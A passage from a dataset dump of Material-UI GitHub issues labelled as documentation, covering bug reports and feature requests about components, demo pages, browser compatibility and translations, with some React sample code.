a duplicate.\r\n\r\n## Expected Behavior\r\n<!---\r\n    Describe what should happen.\r\n-->\r\nThe generated import statement should be: `@material-ui/core/<Component>`\r\n\r\n## Current Behavior\r\n<!---\r\n    Describe what happens instead of the expected behavior.\r\n-->\r\nThe generated import statement is: `\\packages\\material-ui\\src\\<Component>\\`\r\n## Steps to Reproduce\r\n<!---\r\n    Provide a link to a live example (you can use codesandbox.io) and an unambiguous set of steps to reproduce this bug.\r\n    Include code to reproduce, if relevant (which it most likely is).\r\n\r\n    This codesandbox.io template _may_ be a good starting point:\r\n    https://codesandbox.io/s/github/mui-org/material-ui/tree/master/examples/create-react-app\r\n\r\n    If you're using typescript a better starting point would be\r\n    https://codesandbox.io/s/github/mui-org/material-ui/tree/master/examples/create-react-app-with-typescript\r\n\r\n    If YOU DO NOT take time to provide a codesandbox.io reproduction, should the COMMUNITY take time to help you?\r\n\r\n-->\r\nLink:\r\n\r\n1. Run `yarn docs:api:core` on a Windows machine\r\n\r\n## Your Environment\r\n<!---\r\n    Include as many relevant details about the environment with which you experienced the bug.\r\n    If you encounter issues with typescript please include version and tsconfig.\r\n-->\r\n\r\n| Tech         | Version |\r\n|--------------|---------|\r\n| Material-UI  |   |\r\n| React        |        |\r\n| Browser      |         |\r\n| TypeScript   |         |\r\n| OS         |    Windows     |\r\n\r\n## Probable Cause\r\n\r\nhttps://github.com/mui-org/material-ui/blob/24cc1f60a1f686c905430356c22892c121c187a1/docs/src/modules/utils/generateMarkdown.js#L368-L382\r\n\r\nLooks like the regex only matches Unix style paths, i.e. forward slashes windows uses back slashes\r\n"},{"labels":["documentation",null],"text":"<!--- Provide a general summary of the issue in the Title above -->\r\n![screenshot from 2018-11-06 13-48-57](https://user-images.githubusercontent.com/40727126/48095979-ee275a80-e1ca-11e8-9610-da0eed3a16e4.png)\r\n\r\nIn this configuration of `Chip` props, there is no space between the `variant` prop and the `icon` closing curly brace, causing the markdown component to miscolor the code snippet.\r\n<!--\r\n    Thank you very much for contributing to Material-UI by creating an issue! ❤️\r\n    To avoid duplicate issues we ask you to check off the following list.\r\n-->\r\n\r\n<!-- Checked checkbox should look like this: [x] -->\r\n- [x] This is not a v0.x issue. <!-- (v0.x is no longer maintained) -->\r\n- [x] I have searched the [issues](https://github.com/mui-org/material-ui/issues) of this repository and believe that this is not a duplicate.\r\n\r\n## Expected Behavior\r\n<!---\r\n    Describe what should happen.\r\n-->\r\nThere should be a space between the aforementioned props and the markdown reader should interpret the snippet like this:\r\n![screenshot from 2018-11-06 13-52-37](https://user-images.githubusercontent.com/40727126/48096117-40687b80-e1cb-11e8-8ede-ec66c808940d.png)\r\n\r\n## Steps to Reproduce\r\n<!---\r\n    Provide a link to a live example (you can use codesandbox.io) and an unambiguous set of steps to reproduce this bug.\r\n    Include code to reproduce, if relevant (which it most likely is).\r\n\r\n    This codesandbox.io template _may_ be a good starting point:\r\n    https://codesandbox.io/s/github/mui-org/material-ui/tree/master/examples/create-react-app\r\n\r\n    If you're using typescript a better starting point would be\r\n    https://codesandbox.io/s/github/mui-org/material-ui/tree/master/examples/create-react-app-with-typescript\r\n\r\n    If YOU DO NOT take time to provide a codesandbox.io reproduction, should the COMMUNITY take time to help you?\r\n\r\n-->\r\nConfigure the chip as shown before in the Chip Playground demo, namely have `icon` set to \"icon\", `avatar` set to \"none\", and `variant` set to \"outlined\".\r\n\r\n## Fix\r\nAdd a space at the end of the string on [this line](https://github.com/mui-org/material-ui/blob/c9a192ef91e47a2b2efb5d2a00b253d60e380400/docs/src/pages/demos/chips/ChipsPlayground.js#L75)\r\n\r\n## Context\r\n<!---\r\n    What are you trying to accomplish? How has this issue affected you?\r\n    Providing context helps us come up with a solution that is most useful in the real world.\r\n-->\r\n\r\n## Your Environment\r\n<!---\r\n    Include as many relevant details about the environment with which you experienced the bug.\r\n    If you encounter issues with typescript please include version and tsconfig.\r\n-->\r\n\r\n| Tech         | Version |\r\n|--------------|---------|\r\n| Material-UI  | v1.?.?  |\r\n| React        |         |\r\n| Browser      |     chrome  67.0.3396.62   |\r\n| TypeScript   |         |\r\n| etc.         |         |\r\n"},{"labels":["documentation",null],"text":"Go to i.e. https://material-ui.com/api/expansion-panel/ with Safari on actual OSX Mohave (Safari 12.0)\r\ntry to navigate by clicking to some left menu entry i.e. \"Layout\" click does not work...\r\nUsing chrome this works...\r\n\r\nThanks\r\nOgnian\r\n\r\n\r\n\r\n"},{"labels":[null,"documentation",null],"text":"I have gotten a lot of user feedback that users don't understand how to close Dialogs. They don't understand that they can press `esc` nor that they can just click anywhere outside the Dialog to close it.\r\n\r\n<!-- Checked checkbox should look like this: [x] -->\r\n- [x] This is not a v0.x issue. <!-- (v0.x is no longer maintained) -->\r\n- [x] I have searched the [issues](https://github.com/mui-org/material-ui/issues) of this repository and believe that this is not a duplicate.\r\n\r\n## Expected Behavior\r\nI'd like an option to include a \"closeIcon\" that should be shown top right, like facebook has for all their Dialogs\r\n\r\n## Current Behavior\r\nUsers don't understand how to close dialogs\r\n\r\n## Examples\r\n![image](https://user-images.githubusercontent.com/5027156/48012789-1a879c00-e123-11e8-9ee2-163a2abe0b79.png)\r\n\r\n\r\n## Context\r\nI'm trying to make my app easier to use. Is there a way to extend `<Dialog />` without needing to re-implement all of the `<Dialog />` behaviour?\r\n"},{"labels":[null,"documentation"],"text":"Demo Show Error : \"An unexpected error has occurred\" . how to view it?"},{"labels":["documentation",null],"text":"I have made a Filter builder using material-ui components which can/may be useful to others! Please have a look and share on the documentation if you see it fits (or it can help others)\r\n\r\nDemo: https://logipro.github.io/logi-filter-builder/\r\nSource code: https://github.com/logipro/logi-filter-builder\r\n\r\nOf course feedbacks are very welcome and I'm sorry if this isn't the right place to post this! "},{"labels":[null,"documentation"],"text":"Is there any example on how can we have resizable Dialogs? Or can we have this feature please?\r\n\r\n- [x] This is not a v0.x issue. <!-- (v0.x is no longer maintained) -->\r\n- [x] I have searched the [issues](https://github.com/mui-org/material-ui/issues) of this repository and believe that this is not a duplicate.\r\n\r\n## Expected Behavior\r\nhttps://jsfiddle.net/p7o2mkg4/\r\n\r\n## Current Behavior\r\nNo dynamic resize logic/example is there.\r\n\r\n## Examples\r\nhttps://jsfiddle.net/p7o2mkg4/\r\n"},{"labels":[null,"documentation",null],"text":"- [X] This is not a v0.x issue. <!-- (v0.x is no longer maintained) -->\r\n- [X] I have searched the [issues](https://github.com/mui-org/material-ui/issues) of this repository and believe that this is not a duplicate.\r\n\r\nOn the last release, the popper stopped working\r\n\r\n## Steps to Reproduce\r\n    https://material-ui.com/utils/popper/\r\n\r\n\r\n| Tech         | Version |\r\n|--------------|---------|\r\n| Material-UI  | v3.3.2 |\r\n| Browser      | IE 11 |\r\n"},{"labels":["documentation",null,null],"text":"# Select the website language manually\r\n\r\n## Expected Behavior\r\n\r\nThe website has a button to switch the locale so that users can choose the website language instead of automatic translation.\r\n\r\n## Current Behavior\r\n\r\nWebsite automatic translation\r\n\r\n## Examples\r\n\r\nIn most cases, I prefer to read English documents. But the site was automatically translated into Chinese and there was no way to switch back to English (I didn't find it). This makes me very confused, because the translated document I am not sure what the author meant.\r\n"},{"labels":[null,"documentation",null,null],"text":"\"Interacative\" should be \"Interactive\"\r\n\r\n- https://github.com/mui-org/material-ui/blob/master/docs/src/pages/demos/tooltips/InteractiveTooltips.js#L19\r\n- https://github.com/mui-org/material-ui/blob/master/docs/src/pages/demos/tooltips/InteractiveTooltips.js#L22"},{"labels":[null,"documentation"],"text":"https://material-ui.com/getting-started/usage/\r\n\r\n![image](https://user-images.githubusercontent.com/2005841/47616377-adc52f80-da9a-11e8-9e59-70fcf33acfed.png)\r\n\r\nWhen clicking in any sidebar item is not working\r\n\r\ntry to click on `component api`\r\n"},{"labels":[null,null,"documentation",null,null],"text":"<!--- Provide a general summary of the issue in the Title above -->\r\nIn the provided mini-variant demo, when you scroll down in the main content pane, it also scrolls down in the drawer. Instead, the two should be independent.\r\n\r\nFurthermore, the unopened drawer does not take up the full height.\r\n\r\n<!--\r\n    Thank you very much for contributing to Material-UI by creating an issue! ❤️\r\n    To avoid duplicate issues we ask you to check off the following list.\r\n-->\r\n\r\n<!-- Checked checkbox should look like this: [x] -->\r\n- [x] This is not a v0.x issue. <!-- (v0.x is no longer maintained) -->\r\n- [x] I have searched the [issues](https://github.com/mui-org/material-ui/issues) of this repository and believe that this is not a duplicate.\r\n\r\n## Expected Behavior\r\n<!---\r\n    Describe what should happen.\r\n-->\r\nWhen I scroll down in the main content portion, it scrolls the content, but the drawer does not move.\r\nWhen I scroll in the drawer section, it scrolls down in the drawer, but the content does not move.\r\n\r\n\r\nThe unopened mini-drawer should take up the full height.\r\n\r\n## Current Behavior\r\n<!---\r\n    Describe what happens instead of the expected behavior.\r\n-->\r\nScroll is linked. When i scroll down in either the drawer or in the content region, it scrolls down in both.\r\n\r\nThe unopened mini-drawer does NOT take up the full height.\r\n\r\n## Steps to Reproduce\r\n<!---\r\n    Provide a link to a live example (you can use codesandbox.io) and an unambiguous set of steps to reproduce this bug.\r\n    Include code to reproduce, if relevant (which it most likely is).\r\n\r\n    This codesandbox.io template _may_ be a good starting point:\r\n    https://codesandbox.io/s/github/mui-org/material-ui/tree/master/examples/create-react-app\r\n\r\n    If you're using typescript a better starting point would be\r\n    https://codesandbox.io/s/github/mui-org/material-ui/tree/master/examples/create-react-app-with-typescript\r\n\r\n    If YOU DO NOT take time to provide a codesandbox.io reproduction, should the COMMUNITY take time to help you?\r\n\r\n-->\r\nLink: https://codesandbox.io/s/m7ymj37qvp (existing, unmodified demo of mini-variant which is linked in the Demos page)\r\n\r\n## Context\r\n<!---\r\n    What are you trying to accomplish? How has this issue affected you?\r\n    Providing context helps us come up with a solution that is most useful in the real world.\r\n-->\r\nI would like to use the mini-variant drawer, but it has problems.\r\n\r\n## Your Environment\r\n<!---\r\n    Include as many relevant details about the environment with which you experienced the bug.\r\n    If you encounter issues with typescript please include version and tsconfig.\r\n-->\r\n\r\n| Tech         | Version |\r\n|--------------|---------|\r\n| Material-UI  | v3.3.1  |\r\n| React        |     16.6.0    |\r\n| Browser      |     Chrome Version 69.0.3497.100 (Official Build) (64-bit)    |\r\n| TypeScript   |    N/A     |\r\n| etc.         |         |\r\n"},{"labels":["documentation"],"text":"It seems like `focusRipple` is `true` by default and not `false` like it is stated in the Docs.\r\n\r\nhttps://material-ui.com/api/button-base/\r\n\r\n<!-- Checked checkbox should look like this: [x] -->\r\n- [x] This is not a v0.x issue. <!-- (v0.x is no longer maintained) -->\r\n- [x] I have searched the [issues](https://github.com/mui-org/material-ui/issues) of this repository and believe that this is not a duplicate.\r\n\r\n## Steps to Reproduce\r\n\r\nClick into the browser, use `tab` key to focus buttons\r\n\r\n[![Edit Material demo](https://codesandbox.io/static/img/play-codesandbox.svg)](https://codesandbox.io/s/78y37p380)\r\n\r\n## Your Environment\r\n<!---\r\n    Include as many relevant details about the environment with which you experienced the bug.\r\n    If you encounter issues with typescript please include version and tsconfig.\r\n-->\r\n\r\n| Tech         | Version |\r\n|--------------|---------|\r\n| Material-UI  | 3.2.0  |\r\n| React        |         |\r\n| Browser      |         |\r\n| TypeScript   |         |\r\n| etc.         |         |\r\n"},{"labels":[null,"documentation",null],"text":"URL was error:\r\n\r\nhttps://material-ui.com/demos/tabs/\r\n"},{"labels":[null,"documentation",null],"text":"<!--- Provide a general summary of the issue in the Title above -->\r\n\r\n<!--\r\n    Thank you very much for contributing to Material-UI by creating an issue! ❤️\r\n    To avoid duplicate issues we ask you to check off the following list.\r\n-->\r\n\r\n<!-- Checked checkbox should look like this: [x] -->\r\n- [x] This is not a v0.x issue. <!-- (v0.x is no longer maintained) -->\r\n- [x] I have searched the [issues](https://github.com/mui-org/material-ui/issues) of this repository and believe that this is not a duplicate.\r\n\r\n## Expected Behavior\r\n<!---\r\n    Describe what should happen.\r\n-->\r\nNavigating around the https://material-ui.com/ site should work on Safari.\r\n## Current Behavior\r\n<!---\r\n    Describe what happens instead of the expected behavior.\r\n-->\r\nUnrecoverable error after navigating and refreshing on some pages. \r\n\r\n## Workaround/Fix?\r\nSee original post for possible fix via Workbox upgrade: https://github.com/GoogleChrome/workbox/issues/1730"},{"labels":[null,"documentation"],"text":"<!--- Provide a general summary of the issue in the Title above -->\r\n\r\n<!--\r\n    Thank you very much for contributing to Material-UI by creating an issue! ❤️\r\n    To avoid duplicate issues we ask you to check off the following list.\r\n-->\r\n\r\n<!-- Checked checkbox should look like this: [x] -->\r\n- [x] This is not a v0.x issue. <!-- (v0.x is no longer maintained) -->\r\n- [x] I have searched the [issues](https://github.com/mui-org/material-ui/issues) of this repository and believe that this is not a duplicate.\r\n\r\n\r\nthis is en doc\r\n![image](https://user-images.githubusercontent.com/14303098/47408206-eb6f4300-d790-11e8-9937-deb1c1cb7c2d.png)\r\nand this is zh doc\r\n![image](https://user-images.githubusercontent.com/14303098/47408220-ff1aa980-d790-11e8-8e9e-c2de99d11f5d.png)\r\nI found translation [here](https://translate.material-ui.com/translate/material-ui-docs/218/en-zhcn)\r\n\r\n![image](https://user-images.githubusercontent.com/14303098/47408704-03e05d00-d793-11e8-9860-0413f082ffa3.png)\r\n\r\nIt seems that CrowdIn is not work well with MarkDown？\r\n\r\n\r\n"},{"labels":[null,null,"documentation",null],"text":"<!--- Provide a general summary of the feature in the Title above -->\r\n\r\n<!--\r\n    Thank you very much for contributing to Material-UI by creating an issue! ❤️\r\n    To avoid duplicate issues we ask you to check off the following list.\r\n-->\r\n\r\n<!-- Checked checkbox should look like this: [x] -->\r\n- [x] This is not a v0.x issue. <!-- (v0.x is no longer maintained) -->\r\n- [x] I have searched the [issues](https://github.com/mui-org/material-ui/issues) of this repository and believe that this is not a duplicate.\r\n\r\nI was about to implement a custom transition for the dialog opening, but when looking i the documentation there is no information at all about what the Dialog provides to me and what I am supposed to actually do.\r\n\r\nThis can of course be seen by examining the code but it would be awesome if the documentation explained what I needed to know."},{"labels":[null,"documentation",null],"text":"<!--- Provide a general summary of the issue in the Title above -->\r\nSelection Controls don't work in IE 11. By selection controls I mean checkboxes, switches and radios as described here: https://material-ui.com/demos/selection-controls/\r\n\r\n<!-- Checked checkbox should look like this: [x] -->\r\n- [x] This is not a v0.x issue. <!-- (v0.x is no longer maintained) -->\r\n- [x] I have searched the [issues](https://github.com/mui-org/material-ui/issues) of this repository and believe that this is not a duplicate.\r\n\r\n## Expected Behavior\r\nIn IE 11, when I click on a switch/checkbox/radio, it should change the value and perform the animation.\r\n\r\n## Current Behavior\r\nIn IE 11, when I click on a switch/checkbox/radio, it doesn't do anything. It doesn't move, and it doesn't change its value either.\r\n\r\n## Steps to Reproduce\r\n\r\nOpen this link in IE 11: https://material-ui.com/demos/selection-controls/\r\n\r\n1. Click on a switch/checkbox/radio\r\n2. Nothing happens - no animation, no change of value\r\n\r\n## Context\r\nMy app needs to work in IE 11.\r\n\r\n## Your Environment\r\n<!---\r\n    Include as many relevant details about the environment with which you experienced the bug.\r\n    If you encounter issues with typescript please include version and tsconfig.\r\n-->\r\n\r\n| Tech         | Version |\r\n|--------------|---------|\r\n| Material-UI  | 3.2.0  |\r\n| React        |    16.5.2     |\r\n| Browser      |   Internet Explorer 11.0.9600.19100CO      |\r\n| Browser Update Versions      |   11.0.75 (KB4343205)      |\r\n| TypeScript   |    3.1.1     |\r\n"},{"labels":["documentation"],"text":"I tried Bottom App Bar on a Lenovo a 2010 smartphone. But it isn't working properly. You'll know the issue by watching below image:\r\n![screenshot_2018-10-19-18-20-11](https://user-images.githubusercontent.com/38273300/47219157-a7b0be00-d3cb-11e8-9b20-4f1d94b5f10d.png)\r\nA small space is shown below that Bottom Nav Bar. How could I remove it?\r\nWhen I toggled my web browser (Chrome) to Desktop mod, the UI became more bad:-(\r\nCheck below screenshot:\r\n![screenshot_2018-10-19-18-24-13](https://user-images.githubusercontent.com/38273300/47219373-44735b80-d3cc-11e8-9b4c-95f4e69984cf.png)\r\nSome codes are shown below:\r\nApp.js:\r\n`import React, { Component } from 'react';\r\nimport Ui from './Ui';\r\n\r\nclass App extends Component {\r\n  render() {\r\n     return (\r\n      \t\t<Ui />\r\n    );\r\n  }\r\n}\r\n\r\nexport default App;`\r\n\r\nUi.js:\r\n\r\n`import React, { Fragment } from 'react';\r\nimport PropTypes from 'prop-types';\r\nimport { withStyles } from '@material-ui/core/styles';\r\nimport AppBar from '@material-ui/core/AppBar';\r\nimport Toolbar from '@material-ui/core/Toolbar';\r\nimport Typography from '@material-ui/core/Typography';\r\nimport IconButton from '@material-ui/core/IconButton';\r\nimport Paper from '@material-ui/core/Paper';\r\nimport Button from '@material-ui/core/Button';\r\nimport List from '@material-ui/core/List';\r\nimport ListItem from '@material-ui/core/ListItem';\r\nimport ListItemText from '@material-ui/core/ListItemText';\r\nimport ListSubheader from '@material-ui/core/ListSubheader';\r\nimport Avatar from '@material-ui/core/Avatar';\r\nimport MenuIcon from '@material-ui/icons/Menu';\r\nimport AddIcon from '@material-ui/icons/Add';\r\nimport SearchIcon from '@material-ui/icons/Search';\r\nimport MoreIcon from '@material-ui/icons/MoreVert';\r\n\r\nconst styles = theme => ({\r\n  container: {\r\n    position: 'relative',\r\n    maxWidth: 500,\r\n  },\r\n  text: {\r\n    paddingTop: theme.spacing.unit,\r\n    paddingLeft: theme.spacing.unit * 2,\r\n    paddingRight: theme.spacing.unit * 2,\r\n  },\r\n  main: {\r\n    height: 400,\r\n    overflowY: 'auto',\r\n    position: 'relative',\r\n  },\r\n  list: {\r\n    marginBottom: theme.spacing.unit * 2,\r\n  },\r\n  subHeader: {\r\n    backgroundColor: '#fff',\r\n  },\r\n  toolbar: {\r\n    alignItems: 'center',\r\n    justifyContent: 'space-between',\r\n  },\r\n  fabButton: {\r\n    position: 'absolute',\r\n    top: -30,\r\n    left: 0,\r\n    right: 0,\r\n    margin: '0 auto',\r\n  },\r\n});\r\n\r\nconst messages = [\r\n  {\r\n    id: 1,\r\n    primary: 'Brunch this week?',\r\n    secondary: \"I'll be in the neighbourhood this week. Let's grab a bite to eat\",\r\n    person: '/static/images/adeel.jpg',\r\n  },\r\n  {\r\n    id: 2,\r\n    primary: 'Birthday Gift',\r\n    secondary: 'Do you have a suggestion for a good present for John on his work \r\n      anniversary. I am really confused & would love your thoughts on it.',\r\n    person: '/static/images/uxceo-128.jpg',\r\n  },\r\n  {\r\n    id: 3,\r\n    primary: 'Recipe to try',\r\n    secondary: 'I am try out this new BBQ recipe, I think this might be amazing',\r\n    person: '/static/images/remy.jpg',\r\n  },\r\n  {\r\n    id: 4,\r\n    primary: 'Yes!',\r\n    secondary: 'I have the tickets to the ReactConf for this year.',\r\n    person: '/static/images/uxceo-128.jpg',\r\n  },\r\n  {\r\n    id: 5,\r\n    primary: \"Doctor's Appointment\",\r\n    secondary: 'My appointment for the doctor was rescheduled for next Saturday.',\r\n    person: '/static/images/adeel.jpg',\r\n  },\r\n  {\r\n    id: 6,\r\n    primary: 'Discussion',\r\n    secondary: 'Menus that are generated by the bottom app bar (such as a bottom \r\n      navigation drawer or overflow menu) open as bottom sheets at a higher elevation \r\n      than the bar.',\r\n    person: '/static/images/remy.jpg',\r\n  },\r\n  {\r\n    id: 7,\r\n    primary: 'Summer BBQ',\r\n    secondary: 'Who wants to have a cookout this weekend? I just got some furniture\r\n      for my backyard and would love to fire up the grill.',\r\n    person: '/static/images/uxceo-128.jpg',\r\n  },\r\n];\r\n\r\nfunction BottomAppBar(props) {\r\n  const { classes } = props;\r\n  return (\r\n    <div className={classes.container}>\r\n      <Paper square className={classes.main}>\r\n        <Typography className={classes.text} variant=\"h5\" gutterBottom>\r\n          Inbox\r\n        </Typography>\r\n        <List className={classes.list}>\r\n          {messages.map(({ id, primary, secondary, person }) => (\r\n            <Fragment key={id}>\r\n              {id === 1 && <ListSubheader className={classes.subHeader}>Today</ListSubheader>}\r\n              {id === 3 && <ListSubheader className={classes.subHeader}>Yesterday</ListSubheader>}\r\n              <ListItem button>\r\n                <Avatar alt=\"Profile Picture\" src={person} />\r\n                <ListItemText primary={primary} secondary={secondary} />\r\n              </ListItem>\r\n            </Fragment>\r\n          ))}\r\n        </List>\r\n      </Paper>\r\n      <AppBar position=\"sticky\" color=\"primary\">\r\n        <Toolbar className={classes.toolbar}>\r\n          <IconButton color=\"inherit\" aria-label=\"Open drawer\">\r\n            <MenuIcon />\r\n          </IconButton>\r\n          <Button variant=\"fab\" color=\"secondary\" aria-label=\"Add\" className={classes.fabButton}>\r\n            <AddIcon />\r\n          </Button>\r\n          <div>\r\n            <IconButton color=\"inherit\">\r\n              <SearchIcon />\r\n            </IconButton>\r\n            <IconButton color=\"inherit\">\r\n              <MoreIcon />\r\n            </IconButton>\r\n          </div>\r\n        </Toolbar>\r\n      </AppBar>\r\n    </div>\r\n  );\r\n}\r\nBottomAppBar.propTypes = {\r\n  classes: PropTypes.object.isRequired,\r\n};\r\nexport default withStyles(styles)(BottomAppBar);`\r\nPlease help me...\r\nI'm new to ReactJS and Material-Ui"},{"labels":[null,"documentation",null],"text":"<!-- Checked checkbox should look like this: [x] -->\r\n- [x] This is not a v0.x issue. <!-- (v0.x is no longer maintained) -->\r\n- [x] I have searched the [issues](https://github.com/mui-org/material-ui/issues) of this repository and believe that this is not a duplicate.\r\n\r\n## Expected Behavior\r\nAllows a single table cell to span the width of more than one cell or column.\r\nAllows a single table cell to span the height of more than one cell or row.\r\n\r\n## Current Behavior\r\nIn the doc, every cells have one column and one row.\r\n\r\n## Examples\r\n![image](https://user-images.githubusercontent.com/7081782/47094289-3b975400-d22b-11e8-9d89-bbcc767d94bb.png)\r\n\r\nExample of rowspan=\"2\" for \"Favorite\" cell.\r\n\r\n![image](https://user-images.githubusercontent.com/7081782/47094317-4a7e0680-d22b-11e8-8371-cf09e0b1db98.png)\r\n\r\nExample of colspan=\"3\" for \"Subtotal\" and \"Total\" cell.\r\n\r\n## Context\r\nSometimes it makes sense for a cell to span multiple columns or multiple rows. This might be used for a header cell that titles a group of columns, or a side-bar that groups rows of entries.\r\n"},{"labels":["documentation"],"text":"If you set a TextField's type to \"time\" any placeholder text isn't visible.\r\n\r\nOne should be able to set placeholder text, at the very least a placeholder time that follows the standard placeholder style instead of being styled like input values. \r\n\r\nCurrently you can set a default value which acts as input text.\r\n\r\nThis is helpful in conveying to a user the format of the time field they're being asked to fill without pre-setting any values. \r\n"},{"labels":["documentation"],"text":"Pretty self-explanatory, this is a quick fix!"},{"labels":[null,"documentation",null],"text":"Upgrading from 3.1.1. to 3.2.0, we now get warnings when we use a Stepper with a custom connector like this:\r\n\r\n```\r\nimport { ChevronRight } from \"mdi-material-ui\";\r\n\r\n// ...\r\n\r\n<Stepper className=\"breadcrumb\" connector={<ChevronRight />}>\r\n  {arr.map(item => item)}\r\n</Stepper>\r\n```\r\n\r\nThe warnings we receive are:\r\n\r\n<img width=\"1430\" alt=\"screen shot 2018-10-09 at 5 12 04 pm\" src=\"https://user-images.githubusercontent.com/2158187/46705903-9820c080-cbe6-11e8-9fcf-6a57c1c9dd9e.png\">\r\n\r\nWe've tried multiple solutions here, none successful."},{"labels":[null,"documentation",null],"text":"<!--- Provide a general summary of the issue in the Title above -->\r\nFollowed the guide, don't have problems with other components, been using material ui for over 7 month on this project, RTL is just fine.\r\ntried implementing a Slider, but it's broken.\r\n<!--\r\n    Thank you very much for contributing to Material-UI by creating an issue! ❤️\r\n    To avoid duplicate issues we ask you to check off the following list.\r\n-->\r\n\r\n<!-- Checked checkbox should look like this: [x] -->\r\n- [x ] This is not a v0.x issue. <!-- (v0.x is no longer maintained) -->\r\n- [ x] I have searched the [issues](https://github.com/mui-org/material-ui/issues) of this repository and believe that this is not a duplicate.\r\n\r\n## Expected Behavior\r\n<!---\r\n    Describe what should happen.\r\n-->\r\n\r\nthis should not happen\r\nhttps://i.gyazo.com/9258b17c7bc7aa1764c939f4d9382d7a.mp4\r\n\r\n## Current Behavior\r\n<!---\r\n    Describe what happens instead of the expected behavior.\r\n-->\r\n\r\nthis what happens\r\nhttps://i.gyazo.com/9258b17c7bc7aa1764c939f4d9382d7a.mp4\r\n\r\n\r\n## Your Environment\r\n<!---\r\n    Include as many relevant details about the environment with which you experienced the bug.\r\n    If you encounter issues with typescript please include version and tsconfig.\r\n-->\r\n\r\n| Tech         | Version |\r\n|--------------|---------|\r\n| Material-UI  |^3.0.1 |\r\n| React        |       latest  |\r\n| Browser      |        chrome |\r\n| TypeScript   |        x |\r\n| etc.         |         lab is ^3.0.0-alpha.18|\r\n"},{"labels":["documentation",null,null],"text":"Hi, \r\n\r\nIf I am not mistaken there's no current support for the banner component:\r\nhttps://material.io/design/components/banners.html#\r\nhttps://material.io/design/components/banners.html#anatomy\r\n\r\nIf it is not supported, are you planning to do it?\r\nIf it is provided, could you point me to its documentation?\r\n\r\nThanks and keep up the fantastic work!\r\n\r\n![Capture d’écran 2019-10-31 à 19 02 49](https://user-images.githubusercontent.com/3165635/67973590-0df03380-fc11-11e9-8ecb-0ddb2504144c.png)\r\n"},{"labels":[null,"documentation",null],"text":"The following Screenshots are taken from Demo-Page\r\n\r\n## Expected Behavior\r\n![grafik](https://user-images.githubusercontent.com/1215407/46400943-e96b1480-c6fb-11e8-9591-4c3b008c91b8.png)\r\n\r\n\r\n## Current Behavior\r\n![grafik](https://user-images.githubusercontent.com/1215407/46400928-dbb58f00-c6fb-11e8-8a21-e7477e3c783d.png)\r\n\r\n\r\n## Your Environment\r\n<!---\r\n    Include as many relevant details about the environment with which you experienced the bug.\r\n    If you encounter issues with typescript please include version and tsconfig.\r\n-->\r\n\r\n| Tech         | Version |\r\n|--------------|---------|\r\n| Material-UI  | v3.1.2  |\r\n| React        |         |\r\n| Browser      |     IE 11.285.17134.0   |\r\n| TypeScript   |         |\r\n| etc.         |         |\r\n"},{"labels":[null,"documentation",null],"text":"<!--- Provide a general summary of the feature in the Title above -->\r\nAccording to recent Material guideline changes, we have two additional variants for input components: 'filled' and 'select'. \r\nThanks to @enagy27 _TextInput_ components already has been [updated](https://github.com/mui-org/material-ui/pull/12076) to allow such variants.\r\n_Select_ should be next :)\r\n\r\n<!-- Checked checkbox should look like this: [x] -->\r\n- [x] This is not a v0.x issue. <!-- (v0.x is no longer maintained) -->\r\n- [x] I have searched the [issues](https://github.com/mui-org/material-ui/issues) of this repository and believe that this is not a duplicate.\r\n\r\n## Expected Behavior\r\n_Select_ component should allow all possible variants.\r\n\r\n## Current Behavior\r\nVariant option is considered valid, by look of the component stays the same.\r\n\r\n## Examples\r\nhttps://material-components.github.io/material-components-web-catalog/#/component/select\r\n\r\n## Context\r\nUnfortunately, without Select support we can't use other variants of TextInput, since most forms become visually inconsistent.\r\n"},{"labels":["documentation",null],"text":"<!-- Checked checkbox should look like this: [x] -->\r\n- [x] This is not a v0.x issue. <!-- (v0.x is no longer maintained) -->\r\n- [x] I have searched the [issues](https://github.com/mui-org/material-ui/issues) of this repository and believe that this is not a duplicate.\r\n\r\n## Expected Behavior\r\n\r\nI've done a comparison of various JS color utility libraries. I found that `@material-ui/core/es/styles/colorManipulator.js` offers the smallest bundle size of all options I could find. Here's a comparison to other libraries (all numbers are minified; second number is minified + gzipped):\r\n\r\n- colorManipulator.js // 3.02kb, 1.25 gzipped\r\n- [kewler](https://github.com/adriantoine/kewler) // 7.24kb, 2.7kb gzipped\r\n- [spectra](https://github.com/avp/spectra) // 10.5kb, 3.38kb gzipped\r\n- [tinycolor2](https://github.com/bgrins/TinyColor) // 15.2kb, 5.28kb gzipped\r\n- [color](https://github.com/Qix-/color) // 23.1kb, 7.83kb gzipped\r\n- [chroma-js](https://github.com/gka/chroma.js/) // 39.8, 15.9kb gzipped\r\n\r\n## Current Behavior\r\n\r\n@oliviertassinari has stated that the color manipulator is a [private API](https://github.com/mui-org/material-ui/issues/10789#issuecomment-375892148). He also openly asked if there were better open-source alternatives to the private implementation. In my view, there is no better alternative. colorManipulator.js offers basically identical functionality to all of the other libraries, and does it in the fewest amount of bytes.\r\n\r\n## Context\r\n\r\nColor Manipulation is a very generic problem, this library has the best solution, but it is a private API. I think it could be easily publishable as a separate entity within the mono-repo structure. It's already fully unit tested, so there could be no disagreement that it would be in a good state to make publicly accessible. \r\n"},{"labels":["documentation"],"text":"missing closing tag\r\n\r\nhttps://material-ui.com/utils/popover/\r\n\r\n![image](https://user-images.githubusercontent.com/2733862/46187291-a23fe680-c2eb-11e8-88e2-73af6493aba8.png)\r\n"},{"labels":["documentation"],"text":"- [x] This is not a v0.x issue. <!-- (v0.x is no longer maintained) -->\r\n- [x] I have searched the [issues](https://github.com/mui-org/material-ui/issues) of this repository and believe that this is not a duplicate.\r\n\r\n## Expected Behavior\r\nFilled and outlined should work like it works on TextField with FormControl. FormControl api specifies that this prop should work. \r\n\r\n## Current Behavior\r\nIt doesn't. Codesandbox link below explains it pretty well. \r\n\r\n## Steps to Reproduce\r\nhttps://codesandbox.io/s/nwl42ym41p\r\n\r\n## Your Environment\r\n\r\n| Tech         | Version |\r\n|--------------|---------|\r\n| Material-UI  | v3.1.0  |"},{"labels":[null,"documentation",null],"text":"<!--- Provide a general summary of the issue in the Title above -->\r\nThe Snackbar IconButton alignment is not in the straight line if fixed width and height is given. It is slightly below to the message content.\r\n\r\n<!--\r\n    Thank you very much for contributing to Material-UI by creating an issue! ❤️\r\n    To avoid duplicate issues we ask you to check off the following list.\r\n-->\r\n\r\n<!-- Checked checkbox should look like this: [x] -->\r\n- [x] This is not a v0.x issue. <!-- (v0.x is no longer maintained) -->\r\n- [x] I have searched the [issues](https://github.com/mui-org/material-ui/issues) of this repository and believe that this is not a duplicate.\r\n\r\n## Expected Behavior\r\n<!---\r\n    Describe what should happen.\r\n-->\r\nThe IconButton should appear baseline to the message content inside 